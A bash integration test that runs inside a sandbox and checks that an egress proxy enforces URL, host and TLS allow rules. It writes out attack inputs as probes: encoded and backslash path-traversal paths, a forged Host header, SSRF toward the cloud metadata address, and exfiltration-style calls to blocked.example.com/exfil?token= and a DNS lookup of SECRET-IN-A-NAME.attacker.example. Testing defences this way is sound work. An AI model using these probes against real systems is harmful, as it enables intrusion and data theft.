#!/bin/bash
# Runs *inside* the sandbox, as the `run:` input of a real proxy_engine:
# inspect step (see test/integration-test-inspect-restrict.sh). Ported from
# buildcage/docker's test/Dockerfile.inspect-restrict, one shell script
# instead of one Dockerfile RUN step per case (isolated-run's rootfs is the
# real host, not a disposable BuildKit layer, so there is no equivalent of a
# per-RUN-step image layer to assert on here).
#
# ---------------------------------------------------------------------------
# Rules under test (set by test/integration-test-inspect-restrict.sh):
#   allowed_url_rules:
#     GET https://allowed.example.com/public/**
#     GET https://allowed.example.com:9443/public/**
#     GET|POST https://api.example.com/v1/*
#     GET http://10.200.0.100/pub-by-addr/**
#     GET https://*.wildcard.example.com/public/**
#     GET ~^https://blocked\.example\.com:9443/public/.*$
#   allowed_https_rules: sub.wildcard.example.com:443 absent.example.com:443 metadata.example.com:443
#   allowed_http_rules:  allowed.example.com:80
#   allow_tls_rules:     tlspass.example.com:443
# ---------------------------------------------------------------------------
set -uo pipefail

FAILURES=0
S="curl -sS --max-time 10"
# Deliberately unquoted here: $C is expanded unquoted below (word-split into
# argv), so a literal quote around %{http_code} would become part of the
# argument itself instead of being stripped -- see the direct curl calls
# further down, where it's a single literal invocation and quoting is correct.
C="curl -sS -o /dev/null -w %{http_code} --max-time 10"

check_ok() {
  local label="$1" out="$2" want="$3"
  case "$out" in
    "$want"*) echo "  PASS  $label" ;;
    *)
      echo "  FAIL  $label -- got: $out"
      FAILURES=$((FAILURES + 1))
      ;;
  esac
}

check_status() {
  local label="$1" code="$2" want="$3"
  if [ "$code" = "$want" ]; then
    echo "  PASS  $label"
  else
    echo "  FAIL  $label -- expected $want, got $code"
    FAILURES=$((FAILURES + 1))
  fi
}

echo "=== [URL rule - path allowed] ==="
OUT=$($S https://allowed.example.com/public/pkg.tgz)
check_ok "GET /public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [URL rule - path not allowed] ==="
CODE=$($C https://allowed.example.com/private/secret)
check_status "GET /private/secret" "$CODE" "403"

echo "=== [URL rule - method not allowed] ==="
CODE=$($C -X POST https://allowed.example.com/public/pkg.tgz)
check_status "POST /public/pkg.tgz" "$CODE" "403"

echo "=== [URL rule - method allowed] ==="
OUT=$($S -X POST https://api.example.com/v1/thing)
check_ok "POST /v1/thing" "$OUT" "API POST"

echo "=== [Traversal - normalised before the rules see it] ==="
CODE=$($C https://allowed.example.com/public/../private/secret)
check_status "GET /public/../private/secret" "$CODE" "403"

echo "=== [Traversal, encoded] ==="
for P in "%2e%2e/private/secret" "%2e%2e%2fprivate/secret" \
         "%2E%2E%2Fprivate/secret" "..%2fprivate/secret"; do
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --path-as-is --max-time 10 \
         "https://allowed.example.com/public/$P")
  check_status "GET /public/$P" "$CODE" "403"
done

echo "=== [Traversal, backslash] ==="
for P in "x/..%5c../private/secret" "x/%2e%2e%5cprivate/secret" \
         "x/..\\../private/secret" "x/\\..\\../private/secret"; do
  CODE=$(curl -sS -o /dev/null -w '%{http_code}' --path-as-is --max-time 10 \
         "https://allowed.example.com/public/$P")
  check_status "GET /public/$P" "$CODE" "403"
done

echo "=== [Not traversal] ==="
for P in "@scope%2fpkg" "my..pkg" "pkg.tgz" "a%5cb"; do
  OUT=$(curl -sS --path-as-is --max-time 10 "https://allowed.example.com/public/$P")
  check_ok "GET /public/$P" "$OUT" "PUBLIC"
done

echo "=== [Non-standard TLS port 9443] ==="
OUT=$($S https://allowed.example.com:9443/public/pkg.tgz)
check_ok "GET :9443/public/pkg.tgz" "$OUT" "PUBLIC GET"

# blocked.example.com is otherwise always refused (see [Blocked host]
# below), so reaching it here proves the ~regex rule itself granted access.
echo "=== [Regex URL rule - host, port and path all matched] ==="
OUT=$($S https://blocked.example.com:9443/public/pkg.tgz)
check_ok "GET blocked.example.com:9443/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [Regex URL rule - path not allowed] ==="
CODE=$($C https://blocked.example.com:9443/private/secret)
check_status "GET blocked.example.com:9443/private/secret" "$CODE" "403"

# Same host and path, default port instead of the rule's 9443: a ~regex rule
# that failed to carry its port into a real restriction would wrongly let
# this through as "any port".
echo "=== [Regex URL rule - default port not covered by the literal-port rule] ==="
CODE=$($C https://blocked.example.com/public/pkg.tgz)
check_status "GET blocked.example.com/public/pkg.tgz" "$CODE" "403"

echo "=== [Host rule] ==="
OUT=$($S -X DELETE https://sub.wildcard.example.com/anything/at/all)
check_ok "DELETE sub.wildcard.example.com" "$OUT" "ROOT DELETE"

echo "=== [Wildcard host + path rule - path outside the rule] ==="
CODE=$($C https://attacker.wildcard.example.com/private/secret)
check_status "GET attacker.wildcard.example.com/private/secret" "$CODE" "403"

echo "=== [Wildcard host + path rule - path allowed] ==="
OUT=$($S https://attacker.wildcard.example.com/public/pkg.tgz)
check_ok "GET attacker.wildcard.example.com/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [Plaintext host rule] ==="
OUT=$($S http://allowed.example.com/public/pkg.tgz)
check_ok "GET http://allowed.example.com/public/pkg.tgz" "$OUT" "PUBLIC GET"

echo "=== [Blocked host - the full URL, incl. query, is what gets recorded] ==="
CODE=$($C "https://blocked.example.com/exfil?token=SECRET-VALUE")
check_status "GET blocked.example.com/exfil?token=..." "$CODE" "403"

echo "=== [Allowlisted name that does not resolve] ==="
CODE=$($C https://absent.example.com/)
check_status "GET absent.example.com" "$CODE" "502"

echo "=== [Name outside the allowlist is not even looked up] ==="
CODE=$($C https://notallowed.example.com/)
check_status "GET notallowed.example.com" "$CODE" "403"

echo "=== [Forged Host - the destination is not the client's to choose] ==="
OUT=$($S --insecure -H 'Host: allowed.example.com' https://10.200.0.101/public/pkg.tgz)
case "$OUT" in
  PUBLIC\ GET*) echo "  PASS  forged Host reached the resolved origin, not the impostor" ;;
  IMPOSTOR*)
    echo "  FAIL  forged Host reached the address the client chose (impostor)"
    FAILURES=$((FAILURES + 1))
    ;;
  *)
    echo "  FAIL  forged Host -- unexpected body: $OUT"
    FAILURES=$((FAILURES + 1))
    ;;
esac

echo "=== [TLS passthrough] ==="
OUT=$($S --insecure https://tlspass.example.com/public/x)
check_ok "GET tlspass.example.com (passthrough)" "$OUT" "PUBLIC GET"

echo "=== [DNS-only exfiltration] ==="
(nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"

echo "=== [Address in a URL rule] ==="
OUT=$($S http://10.200.0.100/pub-by-addr/x)
check_ok "GET http://10.200.0.100/pub-by-addr/x" "$OUT" "ROOT GET"

echo "=== [Address, path outside the rule] ==="
CODE=$($C http://10.200.0.100/private/secret)
check_status "GET http://10.200.0.100/private/secret" "$CODE" "403"

echo "=== [SSRF via allowlisted name resolving inward] ==="
CODE=$($C --insecure https://metadata.example.com/latest/meta-data)
check_status "GET metadata.example.com (resolves to 169.254.169.254)" "$CODE" "403"

echo "=== [Direct address, no ip rule] ==="
CODE=$($C http://10.200.0.101/)
check_status "GET http://10.200.0.101/ (impostor, no rule)" "$CODE" "403"

echo "=== [UDP is dropped] ==="
UDP_OUT=$(echo probe | nc -u -w 3 10.200.0.102 9999 2>/dev/null || true)
if [ -z "$UDP_OUT" ]; then
  echo "  PASS  UDP to the echo server got no reply (cage drops it)"
else
  echo "  FAIL  UDP left the cage: got reply [$UDP_OUT]"
  FAILURES=$((FAILURES + 1))
fi

echo "=== [DNS is the one exception] ==="
if nslookup allowed.example.com >/dev/null 2>&1; then
  echo "  PASS  DNS still resolves"
else
  echo "  FAIL  DNS lookup failed"
  FAILURES=$((FAILURES + 1))
fi

echo "=== [ICMP is dropped] ==="
if ping -c 1 -W 2 10.200.0.100 >/dev/null 2>&1; then
  echo "  FAIL  ping left the cage"
  FAILURES=$((FAILURES + 1))
else
  echo "  PASS  ping did not leave the cage"
fi

echo "=== End of scenarios: $FAILURES failure(s) ==="
exit "$FAILURES"
